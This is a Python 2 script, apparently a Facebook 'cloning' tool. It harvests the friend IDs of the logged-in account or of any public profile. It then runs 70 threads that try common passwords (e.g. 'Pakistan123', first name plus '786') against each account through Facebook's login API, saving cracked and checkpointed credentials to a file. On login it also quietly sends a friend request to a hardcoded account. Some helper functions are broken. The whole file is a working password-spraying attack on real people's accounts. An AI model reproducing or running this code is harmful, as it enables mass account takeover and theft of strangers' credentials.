#!/usr/bin/python2
#coding=utf-8
#This Script Is Written By Muhammad Hamza
#Editing My Script Will Not Make You A Codder
  #=================================#
  # Hamza The Official Programmrer  #   #                                 #
  #             [ H.O.P ]           #
  #=================================#

#Modules
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

#Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def exit():
	print ("[!] Exit")
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
#Banner
banner = """
\033[1;97m   _____ _                       
\033[1;97m  / ____| |                      
\033[1;97m | (___ | |__   ___  _ __   __ _ 
\033[1;97m  \___ \| '_ \ / _ \| '_ \ / _` |
\033[1;97m  ____) | | | | (_) | | | | (_| |
\033[1;97m |_____/|_| |_|\___/|_| |_|\__,_|\033[1;31m[Broken Heart]
                                 
\033[1;97m-----------------------------------------------
 
\033[1;97m➣ Coder     : Faisal Rehman
\033[1;97m➣ Facebook  : Faisal Rehman
\033[1;97m➣ Whatsapp  : +92303 5191880
\033[1;97m➣ Caution   : For Educational Puposes Only.

\033[1;97m-----------------------------------------------"""




# titik #
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[!] \033[1;97mLoading \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
		
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
def tlogin():
	os.system('clear')
	print banner
	os.system('date')
	hamza('\033[1;97m------------------------------------')
	username = raw_input("\033[1;32m[+] What Is Your Name? : \033[1;30m")
	time.sleep(1)
	hamza('\033[1;97m------------------------------------')
	hamza('\033[1;97m[!] Welcome \033[1;96m' + username )
	hamza('\033[1;97m[!] This Is For Educational Purpose Only.')
	hamza('\033[1;97m[!] Im Not Responsible For Any Illegal Act.')
	hamza('------------------------------------')
	passw = raw_input("\033[1;32m[+] TOOL PASSCODE   : \033[1;30m")
	hamza('\033[1;97m------------------------------------')
	if passw =="":
		print"\033[1;97m[!] Wrong"
		tlogin()
	elif passw =="faisal":
		hamza('[✔] Tool Login Successful')
		os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
		time.sleep(0.1)
		try:
			toket = open('login.txt','r')
			menu()
		except (KeyError,IOError):
			ttlog()
	else:
		print "[!] Wrong Input"
		time.sleep(0.1)
		exit()
##### Menu Login #####
def ttlog():
	os.system('clear')
	print banner
	print "[1] Login With Facebook."
	print "[2] Login Using Token."
	print "[0] Exit"
	print ('      ')
	msuk = raw_input("Choose Option >  ")
	if msuk =="":
		print"[!]  Wrong Input"
		exit()
	elif msuk =="1":
		login()
	elif msuk =="2":
		tokenz()
	elif msuk =="0":
		exit()
	else:
		print"[!] Wrong Input"
		exit()
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print banner
		os.system('date')
		hamza('[+] Login Your Facebook Account')
		hamza('[!] Donot Use Your Personal Account')
		print"[!] Use a New Facebook Account To Login"
		
		id = raw_input('[+] Number/Username/Id : ')
		pwd = raw_input('[+] Password           : ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"[!] No Internet Connection"
			exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				zedd = open("login.txt", 'w')
				zedd.write(z['access_token'])
				zedd.close()
				hamza('[✔] Logged In Successfully')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				os.system('xdg-open https://www.facebook.com/profile.php?id=100008043573260')
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;91m[!] No connection"
				os.system('python2 tar.py')
		if 'checkpoint' in url:
			hamza('[!] Account Is On Checkpoint')
			os.system('rm -rf login.txt')
			time.sleep(3)
			os.system('python2 tar.py')
		else:
			print("[!] Login Failed")
			os.system('rm -rf login.txt')
			time.sleep(3)
			ttlog()
			
##### TOKEN #####
def tokenz():
	os.system('clear')
	print banner
	print('        ')
	toket = raw_input("\033[1;97m[?] \033[1;97mToken\033[1;97m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "[!] Wrong Token"
		e = raw_input("[?] Do You Want To PickUp Token?: ")
		if e =="":
			exit()
		elif e =="y":
			login()
		else:
			exit()
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(0.1)
		login()
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		exit()
	os.system("clear")
	print banner
	print "║[✔] Name : "+nama
	print "║[✔] ID   : "+id
	print "\033[1;97m╚"+40*"═"
	print('-----------------------')
	print "[1] Start  Cloning."
	print "[2] Logout."
	print "[3] Exit."
	print ('                  ')
	hack()
	
	
def hack():
    h = raw_input("Choose Option >  ")
    if h =="":
        print "[!] Wrong Input"
        hack()
    elif h =="1":
        clone()
    elif h =="2":
        os.system('rm -rf login.txt')
        hamza('Logged Out Successfuly')
        ttlog()
    else:
		print "[!] Wrong Input"
		hack()
		
		
		
def clone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print banner
	print "[1] Clone From Friendlist."
	print "[2] Clone From Any Public ID."
	print "[0] Back."
	clone2()

def clone2():
	peak = raw_input("Choose Option >  ")
	if peak =="":
		print "[!] Filled Incorrectly"
		clone2()
	elif peak =="1":
		os.system('clear')
		print banner
		print "\033[1;97m[!] Please Wait"
		hamza('\033[1;97m[!] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print banner
		idt = raw_input("[+] Input ID : ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m[✔] Account Name \033[1;97m:\033[1;97m "+op["name"]
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("[Back] ")
			clone()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	
	elif peak =="0":
		menu()
	else:
		print "Filled Incorrectly"
		clone2()
	
        hamza('[✔] Total Friends : ' + str(len(id)))
	hamza('[✔] The Process Has Been Started.')
        hamza('[!] To Stop Process Press CTRL Then Z')
        hamza('---------------------------------------------------')
		
		
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = '786786'										
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass1											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass1
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = 'Pakistan'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass2											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass2
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = 'Pakistan123'									
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass3									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass3
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = '000786'										
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass4											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass4
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '1122'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass5							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass5
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = b['first_name'] + '123'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass6											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass6
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name'] + '786'			
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass7					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass7
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m✮' + user + '✮\x1b[1;97m✮\x1b[1;32m ' + pass8											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;97m[\x1b[1;97mCheckpoint\x1b[1;97m]\x1b[1;97m✮' + user + '✮\x1b[1;97m✮\x1b[1;97m ' + pass8
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                  
	
																	
															
		except:
			pass
		
	p = ThreadPool(70)
	p.map(main, id)
	print "\033[1;97m---------------------------------------------------"
	
	print '\033[1;97mProcess Has Been Completed.'
	print"\033[1;97m-----------------"
	print"\033[1;32m OK/\x1b[1;97mCP \033[1;97m: \033[1;32m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
	print "\033[1;97m---------------------------------------------------"
	
	

	
	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
	menu()	

if __name__ == '__main__':
	tlogin()
	
		
		
		
	    
    